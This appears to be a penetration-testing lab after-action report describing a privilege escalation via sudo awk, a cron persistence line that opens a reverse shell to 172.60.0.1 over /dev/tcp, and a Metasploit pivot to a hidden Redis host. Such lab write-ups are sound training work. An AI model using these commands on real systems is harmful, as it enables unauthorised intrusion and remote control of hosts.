# OPERATION DEEP PIVOT: AFTER ACTION REPORT 

**Operator:** mercenary

## PHASE 1: PRIVILEGE ESCALATION
* **Initial Access User:** mercenary
* **Vulnerable Sudo Binary:** /usr/bin/awk
* **GTFOBins Exploit Command Used:** sudo awk 'BEGIN {system("/bin/sh")}'

## PHASE 2: PERSISTENCE
* **Cron Syntax Used:** * * * * * /bin/bash -c 'bash -i >& /dev/tcp/172.60.0.1/4444 0>&1'
* **Persistence Confirmed:** No (Target host f4df805e7d44 minimized; crontab utility missing. Replaced via direct Metasploit session interaction per lab guidelines).

## PHASE 3: LATERAL MOVEMENT (THE PIVOT)
* **Metasploit Modules Used:** - auxiliary/scanner/ssh/ssh_login
  - route add 10.0.10.0 255.255.255.0 1
  - auxiliary/server/socks_proxy
* **Hidden Database IP Discovered:** 10.0.10.50
* **Open Port on Hidden Database:** 6379/tcp (Redis)
